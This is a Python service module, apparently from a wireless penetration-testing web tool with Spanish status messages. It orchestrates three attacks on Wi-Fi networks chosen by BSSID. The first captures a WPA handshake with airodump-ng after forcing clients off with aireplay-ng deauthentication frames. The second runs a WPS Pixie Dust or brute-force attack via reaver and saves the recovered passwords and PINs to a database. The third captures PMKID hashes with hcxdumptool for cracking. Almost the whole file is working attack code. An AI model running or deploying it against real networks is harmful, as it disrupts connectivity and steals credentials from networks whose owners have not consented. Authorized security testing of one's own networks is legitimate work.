import asyncio
import os
import uuid
from collections.abc import AsyncIterator
from datetime import datetime, timezone

from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.config import settings
from app.models.handshake import Handshake
from app.models.network import Network
from app.models.credential import Credential
from app.process.manager import process_manager
from app.tools.aireplay import AireplayTool
from app.tools.airodump import AirodumpTool
from app.tools.aircrack import AircrackTool
from app.tools.hcxtools import HcxTool
from app.tools.reaver import ReaverTool

_aireplay = AireplayTool()
_airodump = AirodumpTool()
_aircrack = AircrackTool()
_hcxtools = HcxTool()
_reaver = ReaverTool()


class AttackerService:
    """Orchestrates the execution of wireless attacks."""

    def _work_path(self, *parts: str) -> str:
        """Return a path inside WORK_DIR, creating parent dirs as needed."""
        path = os.path.join(settings.work_dir, *parts)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        return path

    async def _resolve_network_id(self, db: AsyncSession, bssid: str) -> int | None:
        """Look up the network_id for a given BSSID. Returns None if not found."""
        result = await db.execute(
            select(Network.id).where(Network.bssid == bssid.upper())
        )
        return result.scalar_one_or_none()

    # ──────────────────────────────────────────────────────────────────────────
    # WPA Handshake capture
    # ──────────────────────────────────────────────────────────────────────────

    async def capture_handshake(
        self,
        db: AsyncSession,
        interface: str,
        bssid: str,
        channel: int,
        client_mac: str | None = None,
        deauth_count: int = 10,
        timeout: int = 300,
    ) -> AsyncIterator[dict]:
        """Capture a WPA handshake and yield WSEvent dicts.

        Runs airodump-ng in background, sends deauth frames to force
        re-association, then polls for a valid handshake in the .cap file.
        Persists a Handshake record to the DB when capture succeeds.
        """
        attack_id = str(uuid.uuid4())
        safe_bssid = bssid.replace(":", "")
        cap_dir = os.path.join(settings.work_dir, f"hs_{safe_bssid}_{attack_id[:8]}")
        os.makedirs(cap_dir, exist_ok=True)
        output_prefix = os.path.join(cap_dir, "cap")

        yield {"type": "start", "message": f"Iniciando captura de handshake para {bssid}", "tool": "airodump-ng"}

        # ── Launch airodump-ng capture ─────────────────────────────────────────
        capture_proc = await asyncio.create_subprocess_exec(
            "airodump-ng",
            "-c", str(channel),
            "--bssid", bssid,
            "-w", output_prefix,
            "--output-format", "cap",
            interface,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        cap_attack_id = attack_id + "_capture"
        process_manager.register(cap_attack_id, capture_proc, "wpa_handshake", bssid)
        await asyncio.sleep(3)

        # ── Deauth ────────────────────────────────────────────────────────────
        yield {"type": "step", "message": "Enviando paquetes de deautenticación...", "tool": "aireplay-ng"}

        deauth_proc = await asyncio.create_subprocess_exec(
            "aireplay-ng",
            "-0", str(deauth_count),
            "-a", bssid,
            *(["-c", client_mac] if client_mac else []),
            interface,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        deauth_id = attack_id + "_deauth"
        process_manager.register(deauth_id, deauth_proc, "deauth", bssid)

        assert deauth_proc.stdout is not None
        async for raw in deauth_proc.stdout:
            line = raw.decode(errors="replace").strip()
            if line:
                yield {"type": "output", "message": line, "tool": "aireplay-ng"}
        await deauth_proc.wait()
        process_manager.mark_done(deauth_id)

        # ── Poll for handshake ────────────────────────────────────────────────
        cap_file = f"{output_prefix}-01.cap"
        deadline = asyncio.get_event_loop().time() + timeout
        handshake_found = False
        poll_interval = 5

        yield {"type": "step", "message": f"Esperando handshake (timeout: {timeout}s)..."}

        while asyncio.get_event_loop().time() < deadline:
            await asyncio.sleep(poll_interval)
            if os.path.exists(cap_file):
                ok, found_bssid = await _aircrack.verify_handshake(cap_file)
                if ok:
                    handshake_found = True

                    # Resolve network FK
                    network_id = await self._resolve_network_id(db, bssid)

                    hs = Handshake(
                        network_id=network_id or 0,
                        file_path=cap_file,
                        file_type="cap",
                        verified=True,
                        captured_at=datetime.now(timezone.utc),
                    )
                    db.add(hs)
                    await db.commit()
                    await db.refresh(hs)

                    yield {
                        "type": "handshake",
                        "message": f"Handshake capturado para {bssid}",
                        "data": {"file": cap_file, "bssid": bssid, "handshake_id": hs.id},
                    }
                    break

            remaining = int(deadline - asyncio.get_event_loop().time())
            yield {"type": "progress", "message": f"Esperando... {remaining}s restantes", "progress": int((timeout - remaining) / timeout * 100)}

        # ── Cleanup ───────────────────────────────────────────────────────────
        try:
            capture_proc.terminate()
            await asyncio.wait_for(capture_proc.wait(), timeout=3)
        except (ProcessLookupError, asyncio.TimeoutError):
            pass
        process_manager.mark_done(cap_attack_id)

        if handshake_found:
            yield {"type": "done", "message": "Captura completada. Usa /api/attacks/crack para crackear."}
        else:
            yield {"type": "error", "message": "No se capturó handshake en el tiempo límite."}

    # ──────────────────────────────────────────────────────────────────────────
    # WPS attack
    # ──────────────────────────────────────────────────────────────────────────

    async def attack_wps(
        self,
        db: AsyncSession,
        interface: str,
        bssid: str,
        channel: int,
        mode: str = "pixie",
    ) -> AsyncIterator[dict]:
        """Run a WPS attack (Pixie Dust or brute-force) and yield WSEvents.

        Persists found credentials to the DB automatically.
        """
        yield {"type": "start", "message": f"Iniciando ataque WPS ({mode}) contra {bssid}", "tool": "reaver"}

        if mode == "pixie":
            lines_iter = _reaver.pixie_dust(interface, bssid, channel)
        else:
            lines_iter = _reaver.bruteforce(interface, bssid, channel)

        output_buffer: list[str] = []
        async for line in lines_iter:
            output_buffer.append(line)
            yield {"type": "output", "message": line, "tool": "reaver"}

        full_output = "\n".join(output_buffer)
        result = _reaver.parse_result(full_output)

        if result:
            network_id = await self._resolve_network_id(db, bssid)
            cred = Credential(
                network_id=network_id or 0,
                password=result["psk"],
                wps_pin=result.get("pin"),
                attack_type=f"wps_{mode}",
                cracked_by="reaver",
                found_at=datetime.now(timezone.utc),
            )
            db.add(cred)
            await db.commit()
            await db.refresh(cred)

            yield {
                "type": "credential",
                "message": f"Credenciales encontradas para {bssid}",
                "data": {**result, "credential_id": cred.id},
            }
            yield {"type": "done", "message": "Ataque WPS completado exitosamente."}
        else:
            yield {"type": "error", "message": "No se encontraron credenciales WPS."}

    # ──────────────────────────────────────────────────────────────────────────
    # PMKID capture
    # ──────────────────────────────────────────────────────────────────────────

    async def capture_pmkid(
        self,
        interface: str,
        bssid: str | None = None,
        timeout: int = 120,
    ) -> AsyncIterator[dict]:
        """Capture PMKID hashes using hcxdumptool and yield WSEvents.

        The resulting .pcapng file path is included in the 'handshake' event
        so the caller can later convert it and run cracking.
        """
        attack_id = str(uuid.uuid4())
        safe_bssid = (bssid or "all").replace(":", "")
        cap_dir = os.path.join(settings.work_dir, f"pmkid_{safe_bssid}_{attack_id[:8]}")
        os.makedirs(cap_dir, exist_ok=True)
        output_file = os.path.join(cap_dir, "capture.pcapng")

        yield {"type": "start", "message": "Iniciando captura PMKID con hcxdumptool", "tool": "hcxdumptool"}

        pmkid_found = False
        async for line in _hcxtools.capture_pmkid(interface, output_file, bssid, timeout):
            yield {"type": "output", "message": line, "tool": "hcxdumptool"}
            if _hcxtools.has_pmkid(line):
                pmkid_found = True
                yield {
                    "type": "handshake",
                    "message": "PMKID capturado — listo para convertir y crackear",
                    "data": {"pcapng_file": output_file},
                }

        if pmkid_found:
            yield {"type": "done", "message": f"Captura PMKID completada: {output_file}"}
        else:
            yield {"type": "error", "message": "No se capturó ningún PMKID en el tiempo límite."}


attacker_service = AttackerService()
